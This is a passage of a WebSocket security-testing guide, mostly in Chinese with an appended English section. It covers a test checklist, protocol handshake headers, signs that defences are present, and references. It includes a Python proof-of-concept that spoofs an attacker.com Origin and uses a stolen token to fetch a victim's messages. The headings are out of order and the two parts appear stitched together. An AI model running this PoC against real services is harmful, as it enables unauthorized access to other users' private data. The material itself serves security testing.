# websocket-test · part 1 · part 2

> 分段 2/2。索引见 `websocket-test-p1.md`。

3. 分析消息格式（JSON/二进制/文本）
4. 识别消息类型（auth/message/command/subscribe）
```

### 9.2 安全测试

```
1. Origin 验证测试
2. 认证测试（无认证/弱认证/Token 重放）
3. 消息注入测试（XSS/SQL/命令注入）
4. 越权测试（访问他人消息/房间）
5. CSWSH 测试
6. 信息泄露测试
7. DoS 测试（谨慎）
```

### 9.3 PoC 编写

```python
# 完整 PoC 示例
import websocket
import json

def exploit_websocket():
    """WebSocket 漏洞利用 PoC"""
    
    # 1. 连接（绕过 Origin 检查）
    ws = websocket.create_connection(
        "wss://target.com/chat",
        header=["Origin: https://attacker.com"]
    )
    
    print("[+] WebSocket 连接成功（Origin 验证绕过）")
    
    # 2. 认证（如果需要）
    auth_msg = json.dumps({
        "type": "auth",
        "token": "STOLEN_TOKEN"
    })
    ws.send(auth_msg)
    
    # 3. 越权访问他人消息
    get_messages = json.dumps({
        "type": "getMessages",
        "userId": "VICTIM_ID"
    })
    ws.send(get_messages)
    
    # 4. 接收响应
    response = ws.recv()
    print(f"[+] 获取到受害者消息: {response}")
    
    # 5. 关闭连接
    ws.close()

exploit_websocket()
```

---
## 十、防护检测

```python
# 检测是否有安全防护

# 1. Origin 验证
# 特征: 非白名单 Origin 被拒绝

# 2. 认证要求
# 特征: 无 Token 无法连接或接收消息

# 3. 速率限制
# 特征: 短时间大量消息被限制

# 4. 消息验证
# 特征: 恶意消息被过滤或拒绝

# 5. CSRF Token
# 特征: 握手时需要 CSRF Token
```

---
## 十二、参考资源

```
# WebSocket 安全
https://portswigger.net/web-security/websockets

# CSWSH
https://christian-schneider.net/CrossSiteWebSocketHijacking.html

# WebSocket 工具
https://github.com/vi/websocat
https://github.com/websockets/wscat
```

---
## 二、补充：websocket

### websocket

### WebSocket Security
## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-sec`.

---
## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---
